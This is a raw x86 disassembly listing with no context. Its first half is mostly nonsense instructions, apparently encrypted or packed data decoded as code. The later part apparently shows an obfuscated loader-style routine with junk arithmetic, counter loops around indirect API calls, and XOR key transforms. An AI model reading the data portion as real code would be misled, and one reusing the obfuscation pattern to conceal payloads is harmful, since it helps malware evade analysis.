  408c13:	loopne 0x408bd2
  408c15:	xor    BYTE PTR [ecx],0xa1
  408c18:	stos   BYTE PTR es:[edi],al
  408c19:	or     al,0x82
  408c1b:	and    ebp,esp
  408c1d:	retf   0xfb78
  408c20:	and    BYTE PTR [ebp+0x4d],0x70
  408c24:	sub    ebp,DWORD PTR [ebx+ebx*2+0x15ddaada]
  408c2b:	idiv   DWORD PTR [ecx-0x34]
  408c2e:	xlat   BYTE PTR ds:[ebx]
  408c2f:	sbb    esp,edi
  408c31:	jns    0x408c75
  408c33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c34:	xchg   BYTE PTR [edx+0x6b],cl
  408c37:	mov    dh,0x2
  408c39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c3a:	mov    edx,esi
  408c3c:	adc    eax,0xbcb5010
  408c41:	cli    
  408c42:	cmp    al,0xe7
  408c44:	add    edi,edx
  408c46:	or     BYTE PTR [edx+0x3cf9cd82],ah
  408c4c:	sbb    al,0xa9
  408c4e:	adc    ebx,edx
  408c50:	call   FWORD PTR [edi]
  408c52:	in     eax,dx
  408c53:	es out dx,eax
  408c55:	or     eax,0xb5c743b8
  408c5a:	mov    al,0x38
  408c5c:	rcr    DWORD PTR [ebx+0x5560ff0d],1
  408c62:	in     al,0x28
  408c64:	pushf  
  408c65:	push   cs
  408c66:	or     eax,0xfe034483
  408c6b:	test   DWORD PTR ds:0xf25c971f,edx
  408c71:	data16 (bad) [esi+0x10b60dbc]
  408c78:	test   eax,0xa04405b5
  408c7d:	add    DWORD PTR [esi-0x5c],esi
  408c80:	cmp    eax,DWORD PTR [edx-0x3d]
  408c83:	repz popf 
  408c85:	adc    dl,BYTE PTR [edx+eax*2+0x20]
  408c89:	and    BYTE PTR [edx-0x6e8112b6],al
  408c8f:	mov    esp,0x60755382
  408c94:	dec    esi
  408c95:	test   DWORD PTR [ebx],0xcbebd85f
  408c9b:	aaa    
  408c9c:	or     DWORD PTR [eax+0x1cee6de9],ebp
  408ca2:	pop    esi
  408ca3:	test   eax,0xd9713f8d
  408ca9:	mov    ebx,0x9d635fef
  408cae:	fwait
  408caf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cb0:	pop    esi
  408cb1:	pushf  
  408cb2:	cmp    ecx,DWORD PTR [esi]
  408cb4:	and    DWORD PTR [edi+0xd635eb6],edx
  408cba:	dec    ebp
  408cbb:	push   0x7b
  408cbd:	jns    0x408cc6
  408cbf:	and    eax,0x8e20b797
  408cc4:	scas   al,BYTE PTR es:[edi]
  408cc5:	cmp    eax,0x2ffeb121
  408cca:	push   ss
  408ccb:	sub    DWORD PTR [esi-0x2],edi
  408cce:	adc    eax,0x1b2a1732
  408cd3:	mov    ds:0xbb1ec3d8,eax
  408cd8:	fistp  QWORD PTR [ebx+0x9]
  408cdb:	sbb    dh,BYTE PTR ds:0x5ad7af7a
  408ce1:	stos   DWORD PTR es:[edi],eax
  408ce2:	xchg   ebp,eax
  408ce3:	fld    QWORD PTR [edx-0x6b58be7e]
  408ce9:	xchg   esi,eax
  408cea:	mov    bh,0x5
  408cec:	mov    ebp,ecx
  408cee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cef:	retf   
  408cf0:	or     bh,BYTE PTR [esi+edx*2-0x17ae5a46]
  408cf7:	or     eax,0x3a7680a9
  408cfc:	mov    ds:0x47141db4,al
  408d01:	jnp    0x408d7c
  408d03:	sub    eax,0xa22d44e0
  408d08:	(bad)
  408d0c:	fs gs je 0x408cc3
  408d10:	ret    0xc502
  408d13:	std    
  408d14:	push   ss
  408d15:	in     eax,0x27
  408d17:	cdq    
  408d18:	add    BYTE PTR [edi+0x3ddb48ea],bl
  408d1e:	xchg   esi,eax
  408d1f:	test   DWORD PTR [esi+0x43],esi
  408d22:	in     eax,dx
  408d23:	pop    edx
  408d24:	rol    ecx,cl
  408d26:	scas   eax,DWORD PTR es:[edi]
  408d27:	(bad)  ds:0x5dcd42c4
  408d2d:	(bad)
  408d30:	push   cs
  408d31:	adc    al,0x56
  408d33:	fistp  DWORD PTR [ebp-0x51]
  408d36:	gs add eax,0x52d45675
  408d3c:	mov    ebp,0xdde413b1
  408d41:	jnp    0x408ce9
  408d43:	cli    
  408d44:	xchg   ebp,eax
  408d45:	mov    ebx,0x426a7a18
  408d4a:	bound  ecx,QWORD PTR [ebx]
  408d4c:	or     ecx,DWORD PTR [edi]
  408d4e:	or     DWORD PTR [esi],ecx
  408d50:	imul   esi,DWORD PTR [ebx-0x792a1c46],0xffffffc8
  408d57:	dec    edx
  408d58:	adc    BYTE PTR [ebx-0x26],cl
  408d5b:	cwde   
  408d5c:	push   esi
  408d5d:	sti    
  408d5e:	(bad)  
  408d60:	mov    esi,0x3d617304
  408d65:	dec    ecx
  408d66:	add    al,BYTE PTR ds:0xf4f96fcc
  408d6c:	std    
  408d6d:	xor    al,0xbf
  408d6f:	mov    al,0x4
  408d71:	mov    ecx,DWORD PTR [edx+esi*2]
  408d74:	ds in  eax,dx
  408d76:	cmp    DWORD PTR [edi+0x7d8bd703],ebx
  408d7c:	clc    
  408d7d:	lea    edx,[edx+edi*1+0x32729b]
  408d84:	mov    DWORD PTR [ebp-0x8],edx
  408d87:	mov    edx,DWORD PTR [ebp-0x20]
  408d8a:	xor    edx,eax
  408d8c:	mov    edi,0xffcd8d65
  408d91:	sub    edi,edx
  408d93:	add    edi,DWORD PTR [ebp-0x10]
  408d96:	mov    edx,DWORD PTR [ebp-0x20]
  408d99:	jmp    0x408f4a
  408d9e:	adc    BYTE PTR [esi],cl
  408da0:	das    
  408da1:	test   eax,0xb790a931
  408da6:	xor    al,0xa9
  408da8:	mov    ch,0xa
  408daa:	sbb    BYTE PTR [edi],bl
  408dac:	dec    edi
  408dad:	adc    dh,BYTE PTR [ecx-0x7581812f]
  408db3:	jg     0x408e33
  408db5:	jle    0x408d52
  408db7:	push   esi
  408db8:	int3   
  408db9:	sti    
  408dba:	(bad)  
  408dbb:	aam    0x14
  408dbd:	mov    ecx,0x40ba0cdb
  408dc2:	xchg   esi,eax
  408dc3:	add    BYTE PTR [ebp-0x74],0x4a
  408dc7:	cmp    DWORD PTR [edx+0x39a95b17],0xf806c8cd
  408dd1:	mov    esi,DWORD PTR ds:0x8ed61d5d
  408dd7:	stos   BYTE PTR es:[edi],al
  408dd8:	jne    0x408e4e
  408dda:	mov    dh,0x4c
  408ddc:	mov    ah,0x6c
  408dde:	lds    edi,FWORD PTR [ebp+0x4a06b807]
  408de4:	jg     0x408dc1
  408de6:	xor    al,BYTE PTR [esi]
  408de8:	test   eax,0xe04ab6a2
  408ded:	test   BYTE PTR [ebx-0x6a4035ea],dh
  408df3:	fdiv   DWORD PTR [edi-0x67]
  408df6:	fldcw  WORD PTR [ebx-0x27]
  408df9:	push   ecx
  408dfa:	inc    ebx
  408dfb:	or     ebp,ecx
  408dfd:	mov    eax,0x70105257
  408e02:	sbb    al,0x14
  408e04:	and    al,0xee
  408e06:	xchg   BYTE PTR [eax+0x39a92ffb],dh
  408e0c:	stos   DWORD PTR es:[edi],eax
  408e0d:	and    ebp,DWORD PTR [ecx+0x2c210d09]
  408e13:	sti    
  408e14:	hlt    
  408e15:	icebp  
  408e16:	cmc    
  408e17:	push   esp
  408e18:	hlt    
  408e19:	test   DWORD PTR [eax+0x58cee26c],esp
  408e1f:	aad    0xa1
  408e21:	xor    BYTE PTR [eax+0x66],ah
  408e24:	addr16 (bad) 
  408e26:	cmp    al,cl
  408e28:	mov    edx,0xc75917df
  408e2d:	popa   
  408e2e:	adc    dh,ch
  408e30:	lock mov ch,0x9c
  408e33:	nop
  408e34:	xchg   esp,eax
  408e35:	cmc    
  408e36:	fsub   QWORD PTR [esi-0x7e2d06ae]
  408e3c:	mov    bh,0xb8
  408e3e:	pop    ecx
  408e3f:	xchg   ecx,eax
  408e40:	dec    ebx
  408e41:	ds js  0x408e9a
  408e44:	mov    WORD PTR [edx-0x4e],?
  408e47:	pop    edx
  408e48:	loope  0x408e6d
  408e4a:	lods   al,BYTE PTR ds:[esi]
  408e4b:	in     eax,0xd3
  408e4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e4f:	mov    ecx,0x9cbd0520
  408e54:	mov    esi,0x2d7e1556
  408e59:	mov    DWORD PTR [esp+edx*2],edi
  408e5c:	or     BYTE PTR [ebx],bl
  408e5e:	and    BYTE PTR [ecx-0x39fcb6f5],cl
  408e64:	mov    ch,0x7
  408e66:	inc    ecx
  408e67:	fcom   DWORD PTR [ebx-0x46]
  408e6a:	sbb    al,0xf5
  408e6c:	xchg   dl,bl
  408e6e:	lahf   
  408e6f:	in     eax,0x73
  408e71:	jne    0x408e89
  408e73:	fs test al,0x20
  408e76:	and    ebx,DWORD PTR [eax-0x6ab08972]
  408e7c:	inc    ebp
  408e7d:	(bad)  
  408e7e:	mov    dl,0x50
  408e80:	mov    edx,ebx
  408e82:	adc    DWORD PTR [ebp+0x42],eax
  408e85:	aad    0x9e
  408e87:	jmp    0xc3aa:0x485d8ade
  408e8e:	aam    0x9c
  408e90:	fist   WORD PTR [ebx+0x4]
  408e93:	neg    DWORD PTR [edi]
  408e95:	cmp    DWORD PTR [ecx-0x567fcc03],edi
  408e9b:	popa   
  408e9c:	test   al,0xfa
  408e9e:	xor    edi,esi
  408ea0:	jo     0x408e5d
  408ea2:	mov    dh,0xc1
  408ea4:	sahf   
  408ea5:	repz xchg esi,eax
  408ea7:	test   DWORD PTR ds:0xbed5bbf4,edi
  408ead:	mov    dl,0x9d
  408eaf:	mov    bl,0x4
  408eb1:	cmp    al,0xe5
  408eb3:	add    al,0x9
  408eb5:	pusha  
  408eb6:	out    dx,al
  408eb7:	adc    al,0x4c
  408eb9:	push   edi
  408eba:	loop   0x408f19
  408ebc:	dec    ecx
  408ebd:	sbb    BYTE PTR [ebp+0x79a29cc6],0x2c
  408ec4:	stc    
  408ec5:	or     cl,BYTE PTR [ebp+0x3a]
  408ec8:	mov    dh,0xc4
  408eca:	into   
  408ecb:	fdivr  DWORD PTR [esi+0x55016907]
  408ed1:	jbe    0x408efe
  408ed3:	jmp    0x9e9c:0xa0a96a9
  408eda:	into   
  408edb:	jne    0x408f02
  408edd:	nop
  408ede:	push   ds
  408edf:	aaa    
  408ee0:	push   ecx
  408ee1:	jnp    0x408ef3
  408ee3:	dec    ebx
  408ee4:	pop    ecx
  408ee5:	test   bl,dh
  408ee7:	test   BYTE PTR [esi+ebp*1-0x36],0x17
  408eec:	ror    DWORD PTR [edx],1
  408eee:	cli    
  408eef:	lods   eax,DWORD PTR ds:[esi]
  408ef0:	in     al,dx
  408ef1:	xchg   BYTE PTR [ecx-0x2d],ah
  408ef4:	lods   al,BYTE PTR ds:[esi]
  408ef5:	mov    eax,ecx
  408ef7:	xchg   ebp,eax
  408ef8:	int    0x25
  408efa:	pop    ds
  408efb:	mov    edx,0x6518fc11
  408f00:	mov    ch,0x61
  408f02:	inc    edx
  408f03:	test   BYTE PTR [eax-0x2052b3fc],ch
  408f09:	jo     0x408ef9
  408f0b:	jg     0x408ec8
  408f0d:	les    ebx,FWORD PTR [ebp-0x3d]
  408f10:	rol    BYTE PTR [eax+0x3e5e3a58],cl
  408f16:	mov    ds:0x48a05d08,al
  408f1b:	sbb    DWORD PTR [ecx+0x5b027ad7],esi
  408f21:	ss pushf 
  408f23:	push   esi
  408f24:	xchg   DWORD PTR [ebp-0x8d38bc0],edx
  408f2a:	push   esp
  408f2b:	pop    esi
  408f2c:	mov    esi,0x7368c239
  408f31:	and    dh,bh
  408f33:	out    0xd9,al
  408f35:	inc    ebp
  408f36:	ss cdq 
  408f38:	shl    BYTE PTR [ebp-0x6d],cl
  408f3b:	pop    es
  408f3c:	xlat   BYTE PTR ds:[ebx]
  408f3d:	sub    BYTE PTR [edi-0x51],0x32
  408f41:	in     al,0x1b
  408f43:	adc    esi,DWORD PTR [edi]
  408f45:	gs call 0xf85d:0x8b144d25
  408f4d:	xor    edx,eax
  408f4f:	jmp    0x409100
  408f54:	or     al,0x6
  408f56:	addr16 into 
  408f58:	jne    0x408fc9
  408f5a:	mov    ch,0xc4
  408f5c:	mov    dl,0x4d
  408f5e:	(bad)  
  408f60:	mov    BYTE PTR [edi],bl
  408f62:	fiadd  DWORD PTR [esi+0x7e7edfcd]
  408f68:	mov    bh,BYTE PTR [edi+0x7e]
  408f6b:	jle    0x408fc3
  408f6d:	add    eax,0xe8e550da
  408f72:	(bad)  
  408f73:	imul   esp,DWORD PTR es:[edx+0x4dac4167],0xd71d65e5
  408f7e:	xchg   edi,eax
  408f7f:	lods   eax,DWORD PTR ds:[esi]
  408f80:	shl    BYTE PTR [ebx],0x97
  408f83:	sahf   
  408f84:	mov    dl,0x28
  408f86:	sbb    ebp,ecx
  408f88:	loop   0x408f25
  408f8a:	es mov ebx,0x67826c7c
  408f90:	adc    al,0x99
  408f92:	mov    bh,0x8a
  408f94:	cmc    
  408f95:	ror    DWORD PTR es:[eax],0x32
  408f99:	jne    0x408f8d
  408f9b:	and    eax,0xfca9a560
  408fa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fa1:	inc    esi
  408fa2:	jb     0x408fca
  408fa4:	pop    esp
  408fa5:	cmp    BYTE PTR [eax],dl
  408fa7:	jge    0x408fa8
  408fa9:	les    ebp,FWORD PTR [ecx+0x56b8dbe1]
  408faf:	aas    
  408fb0:	dec    esp
  408fb1:	test   esp,ebx
  408fb3:	jp     0x408fbe
  408fb5:	jnp    0x408f45
  408fb7:	mov    dl,0xba
  408fb9:	shr    BYTE PTR [ecx+esi*1],0x1d
  408fbd:	cmp    al,0x64
  408fbf:	sbb    BYTE PTR ds:0xf3901b01,al
  408fc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fc6:	loop   0x409030
  408fc8:	call   0xbd75d709
  408fcd:	xor    eax,0x1f1f12b7
  408fd2:	pop    es
  408fd3:	idiv   BYTE PTR [ecx]
  408fd5:	repnz fwait
  408fd7:	jecxz  0x409010
  408fd9:	xchg   ebp,eax
  408fda:	ja     0x408ffb
  408fdc:	fwait
  408fdd:	(bad)  
  408fde:	aaa    
  408fdf:	jb     0x408f92
  408fe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fe2:	push   ecx
  408fe3:	mov    ah,0x60
  408fe5:	xchg   ebx,eax
  408fe6:	sbb    DWORD PTR [edi-0x1a],edx
  408fe9:	loope  0x408fde
  408feb:	imul   eax,esp,0x36
  408fee:	inc    esi
  408fef:	adc    eax,0xdd349fbe
  408ff4:	fsub   QWORD PTR [ebp-0x1]
  408ff7:	xor    esp,ebx
  408ff9:	sbb    ebx,DWORD PTR [edi-0x67]
  408ffc:	js     0x409063
  408ffe:	mov    ds:0xcf19cf40,al
  409003:	div    DWORD PTR [edx]
  409005:	out    dx,al
  409006:	jecxz  0x40906b
  409008:	sbb    BYTE PTR [esi],al
  40900a:	adc    ah,BYTE PTR [edi-0x21]
  40900d:	cmp    DWORD PTR [edx+0x26],ebp
  409010:	jmp    0xf15a:0xb8fd6652
  409017:	mov    ds:0x81207166,eax
  40901c:	iret   
  40901d:	daa    
  40901e:	pop    ecx
  40901f:	int3   
  409020:	dec    eax
  409021:	mov    es,WORD PTR [edi+esi*2-0x7a]
  409025:	inc    eax
  409026:	in     eax,dx
  409027:	ss (bad) 
  409029:	arpl   WORD PTR [edi-0x373b3ba9],bx
  40902f:	sub    BYTE PTR [edx+0x7c390044],cl
  409035:	dec    ebx
  409036:	sbb    ah,BYTE PTR [eax-0x50]
  409039:	sar    BYTE PTR [ecx],0xf3
  40903c:	add    DWORD PTR ds:0xb3a5b3c5,esp
  409042:	cdq    
  409043:	cmp    al,0x9
  409045:	(bad)  
  409046:	shr    BYTE PTR [ebp-0x424bd298],0x66
  40904d:	xlat   BYTE PTR ds:[ebx]
  40904e:	pop    es
  40904f:	shl    ah,0xc5
  409052:	stos   DWORD PTR es:[edi],eax
  409053:	dec    ecx
  409054:	pop    ss
  409055:	and    DWORD PTR [edi-0x1],eax
  409058:	inc    edx
  409059:	ja     0x409062
  40905b:	call   0x1849cf4e
  409060:	xor    edx,ecx
  409062:	add    eax,0x299da36f
  409067:	push   cs
  409068:	cmp    eax,0x37ef12ce
  40906d:	sub    eax,0x1ec29019
  409072:	adc    ebx,DWORD PTR [ebp-0x1d]
  409075:	dec    esi
  409076:	into   
  409077:	lahf   
  409078:	xor    eax,0xedfdd591
  40907d:	ror    bh,0x69
  409080:	sub    eax,0xc3fe77f5
  409085:	dec    ebp
  409086:	push   ebp
  409087:	pop    ecx
  409088:	mul    DWORD PTR [edi+0x4f]
  40908b:	aas    
  40908c:	jecxz  0x40908d
  40908e:	mov    al,ds:0x6688f948
  409093:	sub    DWORD PTR [ebp+0x34],edi
  409096:	add    ecx,eax
  409098:	xchg   ebx,eax
  409099:	sub    ah,BYTE PTR [edx+ebp*8]
  40909c:	bound  eax,QWORD PTR [eax]
  40909e:	out    0x60,al
  4090a0:	push   ebx
  4090a1:	stos   DWORD PTR es:[edi],eax
  4090a2:	pop    esp
  4090a3:	mov    ?,ebx
  4090a5:	sahf   
  4090a6:	imul   esi,DWORD PTR [esp+ecx*8-0x48],0xffffffa7
  4090ab:	imul   DWORD PTR [edx]
  4090ad:	mov    esi,DWORD PTR [edi+0x3a]
  4090b0:	jno    0x1b157b64
  4090b6:	std    
  4090b7:	pop    ds
  4090b8:	sbb    BYTE PTR [esi-0x50f55c10],0x27
  4090bf:	jns    0x409065
  4090c1:	mov    bh,BYTE PTR [edi+0x406f2128]
  4090c7:	(bad)  
  4090c8:	lock pop es
  4090ca:	shl    DWORD PTR [esi-0x2c],cl
  4090cd:	lods   al,BYTE PTR ds:[esi]
  4090ce:	mov    edi,0x132bae3a
  4090d3:	pushf  
  4090d4:	inc    edx
  4090d5:	dec    edx
  4090d6:	jmp    0x40914c
  4090d8:	scas   eax,DWORD PTR es:[edi]
  4090d9:	jle    0x409065
  4090db:	dec    ecx
  4090dc:	sbb    al,0xf
  4090de:	adc    BYTE PTR ss:0x5619e9bf,cl
  4090e5:	lock mov bl,bl
  4090e8:	inc    ebp
  4090e9:	mov    esi,0xd94e1352
  4090ee:	in     eax,0x2e
  4090f0:	mov    dh,0x34
  4090f2:	fldl2t 
  4090f4:	into   
  4090f5:	das    
  4090f6:	and    ebx,ecx
  4090f8:	mov    esp,edx
  4090fa:	out    dx,al
  4090fb:	dec    ebp
  4090fc:	mov    BYTE PTR [esi+edx*4+0xfd103a6],0xaf
  409104:	sar    DWORD PTR [ebx],cl
  409106:	xlat   BYTE PTR ds:[ebx]
  409107:	jbe    0x407629
  40910d:	pop    ebx
  40910e:	pop    edi
  40910f:	leave  
  409110:	ret    0x8
  409113:	push   ebp
  409114:	mov    ebp,esp
  409116:	sub    esp,0x70
  409119:	call   DWORD PTR ds:0x42ea37
  40911f:	and    DWORD PTR ds:0x4304db,0x43043d
  409129:	xor    ecx,ecx
  40912b:	mov    DWORD PTR ds:0x42eddb,0x7bf5
  409135:	cmp    eax,0x86576545
  40913a:	mov    DWORD PTR ds:0x4304e3,0x7971
  409144:	jne    0x409304
  40914a:	cmp    ecx,0x9879
  409150:	mov    DWORD PTR ds:0x42e7d8,0x1505
  40915a:	jne    0x409304
  409160:	push   0x78776563
  409165:	call   DWORD PTR ds:0x42ea77
  40916b:	sbb    DWORD PTR ds:0x430441,0x430471
  409175:	push   0x8678976
  40917a:	or     DWORD PTR ds:0x42edcb,0x624a
  409184:	call   DWORD PTR ds:0x42ea3f
  40918a:	adc    DWORD PTR ds:0x42e7c0,0x43045d
  409194:	test   eax,eax
  409196:	je     0x4091ca
  40919c:	mov    DWORD PTR ds:0x430451,0x7d40
  4091a6:	push   0x87678768
  4091ab:	xor    DWORD PTR ds:0x430435,0x35ac
  4091b5:	push   0x86787676
  4091ba:	or     DWORD PTR ds:0x43046d,0x42e7d4
  4091c4:	call   DWORD PTR ds:0x42eae3
  4091ca:	push   ebx
  4091cb:	mov    ebx,0xf89c8531
  4091d0:	mov    ecx,DWORD PTR ds:0x42e7c8
  4091d6:	and    DWORD PTR ds:0x430459,ecx
  4091dc:	mov    DWORD PTR [ebp-0x8],ebx
  4091df:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4091e6:	adc    DWORD PTR ds:0x430439,edi
  4091ec:	lea    eax,[ebp-0x18]
  4091ef:	mov    DWORD PTR ds:0x42eddb,0x1a
  4091f9:	cmp    DWORD PTR ds:0x42eddb,0x0
  409200:	je     0x409235
  409206:	cmp    DWORD PTR ds:0x42eddb,0x25
  40920d:	jne    0x409219
  409213:	call   DWORD PTR ds:0x42e9e3
  409219:	mov    ecx,DWORD PTR ds:0x42eddb
  40921f:	dec    ecx
  409220:	mov    DWORD PTR ds:0x42eddb,ecx
  409226:	jmp    0x4091f9
  40922b:	sub    DWORD PTR ds:0x42ede3,0x62aa
  409235:	mov    DWORD PTR [ebp-0x14],eax
  409238:	lea    eax,[ebp-0x1c]
  40923b:	mov    DWORD PTR [ebp-0xc],eax
  40923e:	mov    eax,ds:0x42eddf
  409243:	sbb    eax,DWORD PTR ds:0x42eddb
  409249:	mov    ds:0x42eddf,eax
  40924e:	mov    eax,ds:0x4121a8
  409253:	mov    eax,DWORD PTR [eax+0x1c8]
  409259:	mov    eax,DWORD PTR [eax]
  40925b:	mov    ecx,DWORD PTR ds:0x42eddb
  409261:	and    DWORD PTR ds:0x42e7bc,ecx
  409267:	mov    ecx,DWORD PTR [ebp-0xc]
  40926a:	or     DWORD PTR ds:0x430455,0x4304d7
  409274:	push   esi
  409275:	add    DWORD PTR ds:0x42e7cc,edx
  40927b:	mov    esi,0x7510854
  409280:	adc    DWORD PTR ds:0x430455,0x7ea6
  40928a:	xor    eax,esi
  40928c:	or     DWORD PTR ds:0x42edcb,0x4304e7
  409296:	push   edi
  409297:	neg    edi
  409299:	mov    edi,0x32729b
  40929e:	sub    DWORD PTR ds:0x42edcb,0x2aac
  4092a8:	add    eax,edi
  4092aa:	mov    DWORD PTR ds:0x430449,0x4315
  4092b4:	mov    DWORD PTR [ecx],eax
  4092b6:	mov    eax,0x4350
  4092bb:	mov    eax,ds:0x4123c8
  4092c0:	cmp    eax,0x23c13046
  4092c5:	mov    eax,DWORD PTR [ebp-0x4]
  4092c8:	mov    DWORD PTR ds:0x430459,0x50bd
  4092d2:	je     0x409332
  4092d8:	and    DWORD PTR ds:0x42ede3,edx
  4092de:	mov    ecx,DWORD PTR [ebp-0x8]
  4092e1:	add    DWORD PTR ds:0x42e7c8,0x3ec0
  4092eb:	xor    eax,esi
  4092ed:	add    eax,edi
  4092ef:	or     DWORD PTR ds:0x430435,0x6771
  4092f9:	imul   eax,ecx
  4092fc:	mov    DWORD PTR [ebp-0x8],eax
  4092ff:	jmp    0x409535
  409304:	push   0x4122bc
  409309:	call   DWORD PTR ds:0x42e9ff
  40930f:	adc    DWORD PTR ds:0x42eddf,0x42e7cc
  409319:	test   eax,eax
  40931b:	je     0x4091ca
  409321:	xor    eax,eax
  409323:	mov    DWORD PTR ds:0x430455,0x3bf5
  40932d:	jmp    0x4098b3
  409332:	xor    eax,esi
  409334:	and    DWORD PTR ds:0x430451,0x0
  40933e:	jmp    0x409352
  409343:	xor    ecx,ecx
  409345:	or     ecx,DWORD PTR ds:0x430451
  40934b:	inc    ecx
  40934c:	mov    DWORD PTR ds:0x430451,ecx
  409352:	cmp    DWORD PTR ds:0x430451,0x1d
  409359:	jae    0x40939a
  40935f:	cmp    DWORD PTR ds:0x430451,0xc
  409366:	jne    0x409375
  40936c:	push   DWORD PTR [ebp-0x18]
  40936f:	call   DWORD PTR ds:0x42e9e7
  409375:	cmp    DWORD PTR ds:0x430451,0xb
  40937c:	jne    0x40938f
  409382:	mov    ecx,DWORD PTR ds:0x430451
  409388:	inc    ecx
  409389:	mov    DWORD PTR ds:0x430451,ecx
  40938f:	jmp    0x409343
  409394:	or     ecx,DWORD PTR ds:0x42edcb
  40939a:	add    eax,edi
  40939c:	mov    ecx,DWORD PTR ds:0x42e967
  4093a2:	mov    ecx,DWORD PTR [ecx]
  4093a4:	adc    DWORD PTR ds:0x4304d3,ecx
  4093aa:	mov    ds:0x4122b8,eax
  4093af:	mov    DWORD PTR ds:0x4304eb,0x17
  4093b9:	cmp    DWORD PTR ds:0x4304eb,0x0
  4093c0:	je     0x409450
  4093c6:	cmp    DWORD PTR ds:0x4304eb,0x3
  4093cd:	jne    0x4093df
  4093d3:	push   DWORD PTR [ebp-0x1c]
  4093d6:	push   DWORD PTR [ebp-0x24]
  4093d9:	call   DWORD PTR ds:0x42e9eb
  4093df:	cmp    DWORD PTR ds:0x4304eb,0x4
  4093e6:	jne    0x4093f9
  4093ec:	mov    ecx,DWORD PTR ds:0x4304eb
  4093f2:	dec    ecx
  4093f3:	mov    DWORD PTR ds:0x4304eb,ecx
  4093f9:	mov    ecx,DWORD PTR ds:0x4304eb
  4093ff:	dec    ecx
  409400:	mov    DWORD PTR ds:0x4304eb,ecx
  409406:	jmp    0x4093b9
  40940b:	mov    DWORD PTR ds:0x4304df,0x10
  409415:	cmp    DWORD PTR ds:0x4304df,0x0
  40941c:	je     0x409450
  409422:	cmp    DWORD PTR ds:0x4304df,0x1a
  409429:	jne    0x409438
  40942f:	push   DWORD PTR [ebp-0x10]
  409432:	call   DWORD PTR ds:0x42e9ef
  409438:	mov    ecx,DWORD PTR ds:0x4304df
  40943e:	dec    ecx
  40943f:	mov    DWORD PTR ds:0x4304df,ecx
  409445:	jmp    0x409415
  40944a:	not    DWORD PTR ds:0x430461
  409450:	mov    eax,DWORD PTR [ebp-0x8]
  409453:	xor    eax,esi
  409455:	add    eax,edi
  409457:	mov    DWORD PTR ds:0x430469,0x16
  409461:	cmp    DWORD PTR ds:0x430469,0x0
  409468:	je     0x409493
  40946e:	cmp    DWORD PTR ds:0x430469,0x25
  409475:	jne    0x409481
  40947b:	call   DWORD PTR ds:0x42e9f3
  409481:	mov    ecx,DWORD PTR ds:0x430469
  409487:	dec    ecx
  409488:	mov    DWORD PTR ds:0x430469,ecx
  40948e:	jmp    0x409461
  409493:	mov    ds:0x4123c8,eax
  409498:	mov    eax,DWORD PTR [ebp-0x4]
  40949b:	and    DWORD PTR ds:0x42edcf,0x0
  4094a5:	jmp    0x4094b7
  4094aa:	mov    ecx,DWORD PTR ds:0x42edcf
  4094b0:	inc    ecx
  4094b1:	mov    DWORD PTR ds:0x42edcf,ecx
  4094b7:	cmp    DWORD PTR ds:0x42edcf,0x13
  4094be:	jae    0x4094e6
  4094c4:	cmp    DWORD PTR ds:0x42edcf,0x21
  4094cb:	jne    0x4094e1
  4094d1:	push   0x42e8fb
  4094d6:	push   0x42e8a5
  4094db:	call   DWORD PTR ds:0x42ec2b
  4094e1:	jmp    0x4094aa
  4094e6:	mov    ecx,DWORD PTR ds:0x4122b8
  4094ec:	xor    eax,esi
  4094ee:	add    DWORD PTR ds:0x430451,0x1a56
  4094f8:	add    eax,edi
  4094fa:	mov    DWORD PTR ds:0x4304eb,0x68f3
  409504:	cmp    ecx,eax
  409506:	mov    DWORD PTR ds:0x42ede3,0x3c82
  409510:	jne    0x409535
  409516:	sbb    DWORD PTR ds:0x430469,0x89e
  409520:	push   DWORD PTR [ebp-0x4]
  409523:	push   DWORD PTR [ebp-0x8]
  409526:	sbb    DWORD PTR ds:0x4304e3,0x430471
  409530:	call   0x4098b7
  409535:	mov    DWORD PTR ds:0x430439,0x1e
  40953f:	cmp    DWORD PTR ds:0x430439,0x0
  409546:	je     0x40958c
  40954c:	cmp    DWORD PTR ds:0x430439,0x25
  409553:	jne    0x40956c
  409559:	push   0x7778
  40955e:	push   DWORD PTR [ebp-0x14]
  409561:	push   0x42e7dc
  409566:	call   DWORD PTR ds:0x42e9f7
  40956c:	mov    eax,ds:0x430439
  409571:	dec    eax
  409572:	mov    ds:0x430439,eax
  409577:	jmp    0x40953f
  40957c:	mov    edx,DWORD PTR ds:0x430489
  409582:	mov    eax,ds:0x430513
  409587:	sub    edx,eax
  409589:	add    edx,DWORD PTR [edx+eax*1]
  40958c:	mov    eax,ds:0x4121a8
  409591:	mov    eax,DWORD PTR [eax+0x18c]
  409597:	xor    DWORD PTR ds:0x4304cf,0x75b9
  4095a1:	mov    eax,DWORD PTR [eax]
  4095a3:	sub    edx,0xc40
  4095a9:	mov    DWORD PTR [ebp-0x20],eax
  4095ac:	mov    eax,0xf89c853d
  4095b1:	xor    DWORD PTR ds:0x42e7d8,ecx
  4095b7:	mov    DWORD PTR [ebp-0x24],eax
  4095ba:	mov    DWORD PTR [ebp-0x24],eax
  4095bd:	add    edx,edx
  4095bf:	mov    DWORD PTR [ebp-0x24],eax
  4095c2:	mov    DWORD PTR [ebp-0xc],ebx
  4095c5:	mov    DWORD PTR [ebp-0x24],eax
  4095c8:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  4095cf:	and    DWORD PTR ds:0x430441,0x0
  4095d9:	xor    edx,edx
  4095db:	or     edx,DWORD PTR ds:0x430441
  4095e1:	inc    edx
  4095e2:	mov    DWORD PTR ds:0x430441,edx
  4095e8:	cmp    DWORD PTR ds:0x430441,0x23
  4095ef:	jne    0x40961d
  4095f5:	push   0x4d80
  4095fa:	push   DWORD PTR [ebp-0x14]
  4095fd:	push   0x820d
  409602:	push   DWORD PTR [ebp-0x14]
  409605:	push   DWORD PTR [ebp-0x1c]
  409608:	push   0x20d9
  40960d:	push   0x48e2
  409612:	push   0x42e8cd
  409617:	call   DWORD PTR ds:0x42e9fb
  40961d:	cmp    DWORD PTR ds:0x430441,0x1f
  409624:	jb     0x4095d9
  40962a:	add    ecx,0x11fe
